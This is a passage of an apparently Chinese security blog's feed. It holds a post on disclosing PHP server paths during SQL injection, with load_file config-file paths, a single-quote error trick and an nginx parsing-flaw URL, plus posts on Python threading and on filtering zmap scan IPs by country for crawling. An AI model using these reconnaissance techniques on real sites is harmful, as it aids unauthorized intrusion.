title="配置文件找路径"></a>配置文件找路径</h3><p>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">c:\windows\php.ini php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">/etc/php.ini php配置文件</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf Apache配置文件</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</span><br></pre></td></tr></table></figure><h3 id="nginx文件类型错误解析爆路径"><a href="#nginx文件类型错误解析爆路径" class="headerlink" title="nginx文件类型错误解析爆路径"></a>nginx文件类型错误解析爆路径</h3><p>说明：<br>要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径<br><code>www.xxx.com/xx.jpg/x.php</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;php爆绝对路径方法&quot;&gt;&lt;a href=&quot;#php爆绝对路径方法&quot; class=&quot;headerlink&quot; title=&quot;php爆绝对路径方法&quot;&gt;&lt;/a&gt;php爆绝对路径方法&lt;/h1&gt;&lt;h3 id=&quot;单引号爆路径&quot;&gt;&lt;a href=&quot;#单引号爆路径&quot; class=&quot;headerlink&quot; title=&quot;单引号爆路径&quot;&gt;&lt;/a&gt;单引号爆路径&lt;/h3&gt;&lt;p&gt;直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。&lt;br&gt;&lt;code&gt;www.xxx.com/news.php?id=1′&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>python 多线程</title>
    <link href="http://www.7wawa.com/2018/11/06/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>http://www.7wawa.com/2018/11/06/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/</id>
    <published>2018-11-06T14:07:56.000Z</published>
    <updated>2019-01-09T07:15:20.860Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python多线程"><a href="#Python多线程" class="headerlink" title="Python多线程"></a>Python多线程</h1><p>首先导入模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br></pre></td></tr></table></figure><p>然后创建线程任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t = threading.Thread(target=cc, args=(proxy_list,)) #一定要注意args 参数是元祖所以最好多加一个 逗号</span><br></pre></td></tr></table></figure><a id="more"></a><p>然后执行线程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t.start()</span><br></pre></td></tr></table></figure><p>然后调用 join 函数等待线程结束</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">还有就是对应多个线程之间操作共同的变量一定要用锁</span><br></pre></td></tr></table></figure><p>lock = threading.Lock()<br>lock.acquire() #获取锁<br>    try:<br>        proxy_list.append(proxy_dict)<br>    finally:<br>        lock.release() #释放锁 （利用try是因为害怕有什么异常导致不能释放锁）<br><code>`</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Python多线程&quot;&gt;&lt;a href=&quot;#Python多线程&quot; class=&quot;headerlink&quot; title=&quot;Python多线程&quot;&gt;&lt;/a&gt;Python多线程&lt;/h1&gt;&lt;p&gt;首先导入模块&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;import threading&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后创建线程任务&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;t = threading.Thread(target=cc, args=(proxy_list,)) #一定要注意args 参数是元祖所以最好多加一个 逗号&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>geoip处理区分IP地理位置</title>
    <link href="http://www.7wawa.com/2018/10/06/geoip%E5%A4%84%E7%90%86%E5%8C%BA%E5%88%86IP%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE/"/>
    <id>http://www.7wawa.com/2018/10/06/geoip%E5%A4%84%E7%90%86%E5%8C%BA%E5%88%86IP%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE/</id>
    <published>2018-10-06T13:15:15.000Z</published>
    <updated>2019-01-09T07:16:12.917Z</updated>
    
    <content type="html"><![CDATA[<p>zmap官方开放了80端口并且80端口是http服务的全球ip地址下载：<br><a href="https://scans.io/zsearch/4bj9dm7d2nmyd1ad-80-http-get-full_ipv4-20160903T201338-zmap-results.csv.lz4" target="_blank" rel="noopener">https://scans.io/zsearch/4bj9dm7d2nmyd1ad-80-http-get-full_ipv4-20160903T201338-zmap-results.csv.lz4</a></p><p>脚本的目的就是为了利用GEOIP区分处理出哪些IP地址是中国的，只取出中国的IP地址，然后来利用爬虫抓取</p><p>使用脚本前需要安装 pip install pygeoip</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygeoip</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'ip.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">gi = pygeoip.GeoIP(<span class="string">'GeoLiteCity.dat'</span>, pygeoip.MEMORY_CACHE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'123.csv'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    filecsv=csv.reader(file)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> filecsv:</span><br><span class="line">        location = gi.record_by_addr(line[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#print location</span></span><br><span class="line">        <span class="keyword">if</span> location:</span><br><span class="line">            <span class="keyword">if</span> location[<span class="string">'country_code'</span>]==<span class="string">"CN"</span>:</span><br><span class="line">                f.write(line[<span class="number">0</span>]+<span class="string">"\n"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;zmap官方开放了80端口并且80端口是http服务的全球ip地址下载：&lt;br&gt;&lt;a href=&quot;https://scans.io/zsearch/4bj9dm7d2nmyd1ad-80-http-get-full_ipv4-20160903T201338-zmap-results.csv.lz4&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://scans.io/zsearch/4bj9dm7d2nmyd1ad-80-http-get-full_ipv4-20160903T201338-zmap-results.csv.lz4&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;脚本的目的就是为了利用GEOIP区分处理出哪些IP地址是中国的，只取出中国的IP地址，然后来利用爬虫抓取&lt;/p&gt;
&lt;p&gt;使用脚本前需要安装 pip install pygeoip&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>fofa采集脚本基于(phantomjs+selenium)</title>
    <link href="http://www.7wawa.com/2018/10/06/fofa%E9%87%87%E9%9B%86%E8%84%9A%E6%9C%AC%E5%9F%BA%E4%BA%8E-phantomjs-selenium/"/>
    <id>http://www.7wawa.com/2018/10/06/fofa%E9%87%87%E9%9B%86%E8%84%9A%E6%9C%AC%E5%9F%BA%E4%BA%8E-phantomjs-selenium/</id>
    <published>2018-10-06T13:05:57.000Z</published>
    <updated>2020-09-21T15:48:35.984Z</updated>
    
    <content type="html"><![CDATA[<p>新手浏览器自动化练习项目:</p><p>脚本运行:<br><img src="/media/cike/娱乐/github仓库/hexo/blog/source/_posts/20170605104506233.png" alt="运行脚本"><br>数据库保存:<br><img src="/media/cike/娱乐/github仓库/hexo/blog/source/_posts/20170605104551531.png" alt="数据库保存截图"></p><p>脚本连接:<br><a href="https://github.com/huayanqiaq/fofa_spider" target="_blank" rel="noopener">https://github.com/huayanqiaq/fofa_spider</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;新手浏览器自动化练习项目:&lt;/p&gt;
&lt;p&gt;脚本运行:&lt;br&gt;&lt;img src=&quot;/media/cike/娱乐/github仓库/hexo/blog/source/_posts/20170605104506233.png&quot; alt=&quot;运行脚本&quot;&gt;&lt;br&gt;数据库保存:&lt;br&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
</feed>
